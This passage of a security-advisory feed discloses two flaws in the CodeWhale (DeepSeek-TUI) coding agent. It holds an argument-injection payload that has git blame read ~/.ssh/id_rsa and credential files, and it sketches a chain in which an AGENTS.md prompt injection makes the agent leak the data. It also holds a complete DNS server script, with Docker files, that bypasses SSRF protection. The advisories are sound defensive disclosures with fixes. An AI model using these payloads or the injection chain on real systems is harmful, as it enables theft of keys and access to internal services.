<p>The <code>git_blame</code> tool in DeepSeek-TUI passes the model-supplied <code>rev</code> parameter unvalidated into the argv of <code>git blame</code>. <code>git blame</code> accepts <code>--contents=&lt;file&gt;</code>, which causes it to use the file's contents in place of the working tree and echo each line verbatim in the blame output. A <code>rev</code> value of <code>--contents=/path/to/secret</code> therefore exfiltrates the targeted file's contents into the tool result, which is returned to the model and displayed in the chat transcript.</p>
<p>The tool is registered with <code>ApprovalRequirement::Auto</code> and declares <code>ToolCapability::ReadOnly</code>. The read is in-scope for the capability label, but the <em>target</em> of the read is not the user expects <code>git_blame</code> to read files inside the workspace, not arbitrary paths on the host.</p>
<p>This is a sibling of the <code>git_show</code> argument-injection vulnerability filed separately, sharing the same root cause (missing <code>--end-of-options</code> sentinel and unvalidated <code>rev</code>).</p>
<h2 id="impact">Impact</h2>
<p>Arbitrary file read at the privilege of the user running DeepSeek-TUI, via malicious repository content combined with prompt injection (the threat model already documented in CVE-2026-45311).</p>
<p>Reachable as the invoking user:</p>
<ul>
<li><code>~/.ssh/id_rsa</code>, <code>~/.ssh/id_ed25519</code>, and other private keys</li>
<li><code>~/.aws/credentials</code>, <code>~/.config/gh/hosts.yml</code>, <code>~/.netrc</code></li>
<li><code>.env</code> files anywhere in the filesystem</li>
<li>Any project file outside the workspace the tool would normally restrict to</li>
</ul>
<p>The leaked contents land in the model's context. The same model that obeyed the prompt-injection in step one can be instructed to forward the leak via <code>fetch_url</code> (network-policy permitting), summarize it in chat, or write it into a tool output the attacker can later retrieve.</p>
<h2 id="technical-details">Technical Details</h2>
<h3 id="root-cause">Root Cause</h3>
<p><code>crates/tui/src/tools/git_history.rs</code>:</p>
<pre><code class="language-rust">// L314-316
fn approval_requirement(&amp;self) -&gt; ApprovalRequirement {
    ApprovalRequirement::Auto
}

// L322-358 (excerpt)
async fn execute(&amp;self, input: Value, context: &amp;ToolContext) -&gt; Result&lt;ToolResult, ToolError&gt; {
    let path_str = required_str(&amp;input, "path")?;
    let resolved_path = context.resolve_path(path_str)?;   // path is bounded to workspace
    ...
    let rev = optional_str(&amp;input, "rev").unwrap_or("HEAD");   // rev is NOT bounded
    ...
    let mut args = vec![
        "blame".to_string(),
        "--date=iso".to_string(),
        format!("-L{start_line},{end_line}"),
    ];
    if porcelain { args.push("--line-porcelain".to_string()); }
    args.push(rev.to_string());            // unvalidated, no sentinel
    args.push("--".to_string());
    args.push(pathspec.display().to_string());
    ...
}
</code></pre>
<p><code>path</code> correctly flows through <code>context.resolve_path</code>, which enforces workspace containment (<code>spec.rs:342</code>). <code>rev</code> does not and the <code>--</code> separator after <code>rev</code> only ends pathspec parsing, it does not stop option parsing of <code>rev</code> itself.</p>
<p>The JSON schema for <code>rev</code> (L283-285) is <code>{"type": "string"}</code> with no constraints.</p>
<h3 id="why---contents-works">Why <code>--contents</code> Works</h3>
<p><code>git blame --contents=&lt;file&gt; -- &lt;pathspec&gt;</code> blames the working tree path <em>as if its contents were the supplied file</em>. Each line of the supplied file appears verbatim in the porcelain or human-readable output, prefixed with the attribution marker <code>00000000 (External file (--contents) &lt;date&gt; N)</code>. The full line content is preserved.</p>
<p>Two secondary primitives in the same parser also leak data, with smaller
yield:</p>
<ul>
<li><code>--ignore-revs-file=&lt;file&gt;</code> : surfaces parse errors that disclose partial content when the file is not a valid revs list.</li>
<li><code>-S &lt;file&gt;</code>, <code>--reverse &lt;rev1&gt;..&lt;rev2&gt;</code> : not directly exploitable for read but expand the option surface that argv injection can reach.</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Argv assembled by the tool with input
<code>{"path": "a.txt", "rev": "--contents=/home/a/.ssh/id_rsa"}</code>:</p>
<pre><code>git blame --date=iso -L1,200 --contents=/home/a/.ssh/id_rsa -- a.txt
</code></pre>
<p>Reproduced against system <code>git</code> as a non-root user:</p>
<pre><code>$ id
uid=1001(a) gid=1001(a) groups=1001(a)

$ echo "PRIVATEKEYDATA" &gt; /home/a/.ssh/id_rsa
$ chmod 600 /home/a/.ssh/id_rsa

$ git blame --date=iso -L1,5 "--contents=/home/a/.ssh/id_rsa" -- a.txt
00000000 (External file (--contents) 2026-05-19 07:05:51 -0400 1) PRIVATEKEYDATA
</code></pre>
<p>A non-readable target (<code>/etc/shadow</code>, owned by root with mode 0640) returns <code>Permission denied</code>, confirming the read is bounded by uid as expected; this is not a privilege boundary bypass, it is the desktop user's own filesystem view being exposed past the workspace boundary the tool's <code>path</code> argument otherwise enforces.</p>
<p>End-to-end exploitation is identical to the <code>git_show</code> companion: malicious repo → <code>AGENTS.md</code> injection → model calls <code>git_blame</code> with the crafted <code>rev</code> → auto-approval → leaked content returned in tool output and consumed by the model.</p>
<h2 id="remediation">Remediation</h2>
<p>Same shape as the <code>git_show</code> fix:</p>
<pre><code class="language-rust">args.push("--end-of-options".to_string());
args.push(rev.to_string());
args.push("--".to_string());
args.push(pathspec.display().to_string());
</code></pre>
<p>Plus a leading-hyphen rejection on <code>rev</code>. A regression test should pin both <code>rev = "--contents=/etc/passwd"</code> and <code>rev = "--ignore-revs-file=/etc/passwd"</code> as rejected inputs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-c6mw-8xh8-gpq6">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-c6mw-8xh8-gpq6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75912">https://nvd.nist.gov/vuln/detail/CVE-2026-75912</a></li>
<li><a href="https://github.com/Hmbown/CodeWhale/commit/9a34b5034d29f05d1f28fa61b04719ca6a741020">https://github.com/Hmbown/CodeWhale/commit/9a34b5034d29f05d1f28fa61b04719ca6a741020</a></li>
<li><a href="https://www.vulncheck.com/advisories/codewhale-before-argument-injection-via-git-blame">https://www.vulncheck.com/advisories/codewhale-before-argument-injection-via-git-blame</a></li>
<li><a href="https://github.com/advisories/GHSA-c6mw-8xh8-gpq6">https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c6mw-8xh8-gpq6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-04T18:11:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[codewhale] CodeWhale: SSRF‌ bypass - TOCTOU on DNS failure for DNS pinning]]></title>
        <id>https://github.com/advisories/GHSA-6v2g-fpxh-pmmh</id>
        <link href="https://github.com/advisories/GHSA-6v2g-fpxh-pmmh"/>
        <updated>2026-09-04T18:05:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
<h3 id="summary">Summary</h3>
<p>DNS-pinning failure allows natural failure of code, however with a custom DNS server that fails the initial requests and allows the secondary requests, it's possible to bypass the logic.</p>
<h3 id="details">Details</h3>
<p>Simplified attack scenario:</p>
<ol>
<li>Attacker asks agent to visit the <code>mydomain.com</code>.</li>
<li>CodeWhale tries to resolve the IP of <code>mydomain.com</code>, however, the custom DNS server that's controlled by the attacker marks the request DNS‌ query as failed (Time of Check). </li>
<li>CodeWhale allows the code to continue as it expects it request to fail again.</li>
<li>On the secondary (Time of Use), the DNS server resolves mydomain.com to a local IP (e.g., 127.0.0.1)</li>
<li>The request is executed and the content from port 80 is returned to the attacker, allowing full bypass of SSRF mitigations.</li>
</ol>
<p>In the <a href="https://github.com/Hmbown/CodeWhale/blob/8dff2f7525ead210a01347b48f53ae3f20d094ec/crates/tui/src/tools/fetch_url.rs#L362">DNS-pinning</a> section, when DNS fails, the code is allowed to continue as it's expected to fail. However</p>
<h3 id="poc">PoC</h3>
<p>This is a custom DNS server that fails the first requests (in this case, the first and second requests must fail, while the 3rd and 4th are allowed due to A and AAAA DNS queries). Here is the code for the DNS‌ server(for PoC, should be placed in <code>dnser/dns_resolver.py</code>:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""
Local DNS Resolver — customizable request/response handling.
Uses only the standard library + dnslib.

Usage:
    pip install dnslib
    sudo python dns_resolver.py          # binds to 0.0.0.0:53 by default
    python dns_resolver.py --port 5353   # unprivileged port for testing
"""

import argparse
import socket
import threading
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, CNAME, AAAA


UPSTREAM_DNS = ("8.8.8.8", 53)   # fallback resolver


def handle_no_aaaa(query: DNSRecord) -&gt; DNSRecord | None:
    """Drop all AAAA requests."""
    if QTYPE[query.q.qtype] == "AAAA":
        reply = query.reply()
        reply.header.rcode = 3  # NXDOMAIN
        return reply
    return None

def handle_blocked(query: DNSRecord) -&gt; DNSRecord | None:
    """Block domains by returning NXDOMAIN."""
    blocked = {"blocked.example.com.", "ads.tracker.io."}
    qname = str(query.q.qname)
    if qname in blocked:
        print(f"  [BLOCKED] {qname}")
        reply = query.reply()
        reply.header.rcode = 3          # NXDOMAIN
        return reply
    return None

failer = 0
MAX_FAIL = 2
MAX_SUCCESS = 2

def handle_overrides(query: DNSRecord) -&gt; DNSRecord | None:
    global failer
    """Return hardcoded A records for specific names (split-horizon / local dev)."""
    overrides: dict[str, str] = {
        "myapp.local.":     "127.0.0.1",
        "devserver.local.": "192.168.1.100",
        "mydomain.com.":    "127.0.0.1",
    }
    qname = str(query.q.qname)
    qtype = QTYPE[query.q.qtype]

    if qname in overrides and qtype == "A":
        failer += 1
        cycle_pos = (failer - 1) % (MAX_FAIL + MAX_SUCCESS)  # position within cycle
        should_fail = cycle_pos &lt; MAX_FAIL

        print(f"  [OVERRIDE] request={failer} cycle_pos={cycle_pos} fail={should_fail}")

        if should_fail:
            reply = query.reply()
            reply.header.rcode = 3
            reply.header.ra = 0
            return reply

        ip = overrides[qname]
        print(f"  [OVERRIDE] {qname} → {ip}")
        reply = query.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))
        reply.header.ra = 0
        return reply

    return None


def handle_rewrite(query: DNSRecord) -&gt; DNSRecord | None:
    """Rewrite a CNAME transparently (resolve alias locally)."""
    rewrites: dict[str, str] = {
        # "old.internal.": "new.internal.",
    }
    qname = str(query.q.qname)
    if qname in rewrites:
        target = rewrites[qname]
        print(f"  [REWRITE] {qname} → {target}")
        reply = query.reply()
        reply.add_answer(RR(qname, QTYPE.CNAME, rdata=CNAME(target), ttl=60))
        return reply
    return None


def handle_upstream(query: DNSRecord) -&gt; DNSRecord | None:
    """Forward the query to the upstream resolver."""
    try:
        raw = query.pack()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        sock.sendto(raw, UPSTREAM_DNS)
        data, _ = sock.recvfrom(4096)
        sock.close()
        reply = DNSRecord.parse(data)
        print(f"  [UPSTREAM] {query.q.qname} → {UPSTREAM_DNS[0]}")
        return reply
    except Exception as e:
        print(f"  [UPSTREAM ERROR] {e}")
        return None


# Chain of responsibility — handlers are tried in order; first non-None wins.
HANDLERS = [
    handle_blocked,
    handle_overrides,
    handle_rewrite,
    handle_upstream,
]


# ─────────────────────────────────────────────────────────────────────────────
#  Server plumbing — no need to edit below this line
# ─────────────────────────────────────────────────────────────────────────────

def resolve(data: bytes) -&gt; bytes:
    try:
        query = DNSRecord.parse(data)
        qname = str(query.q.qname)
        qtype = QTYPE[query.q.qtype]
        print(f"[QUERY] {qtype} {qname}")

        for handler in HANDLERS:
            reply = handler(query)
            if reply is not None:
                return reply.pack()

        # Fallback: SERVFAIL
        reply = query.reply()
        reply.header.rcode = 2
        return reply.pack()

    except Exception as e:
        print(f"[ERROR] Failed to parse/handle query: {e}")
        return b""


def udp_server(host: str, port: int) -&gt; None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    print(f"DNS resolver listening on {host}:{port} (UDP)")
    while True:
        data, addr = sock.recvfrom(4096)
        threading.Thread(
            target=lambda d=data, a=addr: sock.sendto(resolve(d), a),
            daemon=True,
        ).start()


def tcp_server(host: str, port: int) -&gt; None:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(10)
    print(f"DNS resolver listening on {host}:{port} (TCP)")

    def handle_conn(conn: socket.socket) -&gt; None:
        with conn:
            length_bytes = conn.recv(2)
            if len(length_bytes) &lt; 2:
                return
            length = int.from_bytes(length_bytes, "big")
            data = conn.recv(length)
            response = resolve(data)
            conn.sendall(len(response).to_bytes(2, "big") + response)

    while True:
        conn, _ = srv.accept()
        threading.Thread(target=handle_conn, args=(conn,), daemon=True).start()


def main() -&gt; None:
    parser = argparse.ArgumentParser(description="Local DNS resolver")
    parser.add_argument("--host", default="0.0.0.0", help="Bind address")
    parser.add_argument("--port", type=int, default=53, help="Bind port (use 5353 for unprivileged)")
    args = parser.parse_args()

    t_udp = threading.Thread(target=udp_server, args=(args.host, args.port), daemon=True)
    t_tcp = threading.Thread(target=tcp_server, args=(args.host, args.port), daemon=True)
    t_udp.start()
    t_tcp.start()

    try:
        t_udp.join()
    except KeyboardInterrupt:
        print("\nShutting down.")


if __name__ == "__main__":
    main()
</code></pre>
<p>Docker file to build it(<code>dnser/Dockerfile</code>):</p>
<pre><code class="language-bash">FROM python:3.12-slim

WORKDIR /app

RUN pip install dnslib --no-cache-dir

COPY dns_resolver.py .

EXPOSE 53/udp
EXPOSE 53/tcp

CMD ["python", "-u", "dns_resolver.py", "--host", "0.0.0.0", "--port", "53"]
</code></pre>
<p>Then to simplify the test, we can set everything in a container and make the agent use the local DNS resolver:</p>
<p><code>docker-compose.yml</code>:</p>
<pre><code class="language-yaml">services:
  dns-resolver:
    build: dnser
    container_name: dns-resolver
    restart: unless-stopped
    networks:
      dns-net:
        ipv4_address: 10.0.1.2

  a:
    image: ghcr.io/hmbown/deepseek-tui:latest
    container_name: tui
    environment:
      DEEPSEEK_API_KEY: sk-
    stdin_open: true
    tty: true
    dns: 10.0.1.2
    networks:
      - dns-net
    depends_on:
      - dns-resolver
    sysctls:
      net.ipv6.conf.all.disable_ipv6: 1



networks:
  dns-net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.1.0/24
</code></pre>
<p>Then to check everything we could simply:
<code>sudo docker attach tui</code>
Prompt: <code>read contnet of http://mydomain.com using fetch_url tools, no thinking just raw output</code>
The tool will allow the request to go through 127.0.0.1. To make sure it's not a false-positive I've also installed python in CodeWhale container and ran <code>python3 -m http.server 80</code> as root to make sure the request can actually read content.</p>
<p>To read the logs from dns-resolver:
<code>sudo docker logs -f dns-resolver</code></p>
<h3 id="impact">Impact</h3>
<p>Similar to other SSRF bypasses, other services private on the system, private network, and cloud credentials are at risk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-6v2g-fpxh-pmmh">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-6v2g-fpxh-pmmh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75856">https://nvd.nist.gov/vuln/detail/CVE-2026-75856</a></li>
<li><a href="https://github.com/Hmbown/CodeWhale/commit/26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e">https://github.com/Hmbown/CodeWhale/commit/26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e</a></li>
<li><a href="https://www.vulncheck.com/advisories/codewhale-before-ssrf-bypass-via-dns-pinning-toctou">https://www.vulncheck.com/advisories/codewhale-before-ssrf-bypass-via-dns-pinning-toctou</a></li>
<li><a href="https://github.com/advisories/GHSA-6v2g-fpxh-pmmh">https://github.com/advisories/GHSA-6v2g-fpxh-pmmh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6v2g-fpxh-pmmh</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-04T18:05:12.000Z</published>
    </entry>
</feed>